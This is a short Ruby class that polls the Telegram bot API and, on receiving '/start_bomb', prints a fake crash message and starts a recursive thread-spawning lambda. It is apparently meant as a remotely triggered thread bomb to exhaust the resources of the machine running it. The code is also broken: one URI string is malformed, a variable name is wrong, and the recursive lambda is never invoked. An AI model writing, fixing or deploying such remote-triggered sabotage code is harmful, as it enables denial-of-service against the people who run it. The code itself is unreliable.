class TelegramProcBombListener
	def initialize(token)
		require 'net/http'
		require 'json'
		if JSON.parse(Net::HTTP.get(URI("https://api.telegram.org/bot#{token}/getUpdates")))["ok"]
			puts "READY"
			@last_uid=JSON.parse(Net::HTTP.get(URI("https://api.telegram.org/bot#{token}/getUpdates)))")))["result"][-1]["update_id"] rescue @last_uid = 0
			Thread.new do
				exe=lambda{print"\n=> SYSFAIL_CRIT\nirb(main):$$$:$> ";f=lambda{Thread.new{loop{Thread.new{f.call}}}}}
				wait=Thread.new{loop{
					resp=JSON.parse(Net::HTTP.get(URI("https://api.telegram.org/bot#{token}/getUpdates")))
					if resp["ok"] 
						if resp["result"]!=[] 
							if (resp["result"][-1]["update_id"]!=last_uid)&&(resp["result"][-1]["message"]["text"]=="/start_bomb")
								Thread.new{exe.call}
								wait.kill
							end
						end
					end
				}}
			nil
			end	
		else
			puts "ERROR"
		end
	end
end
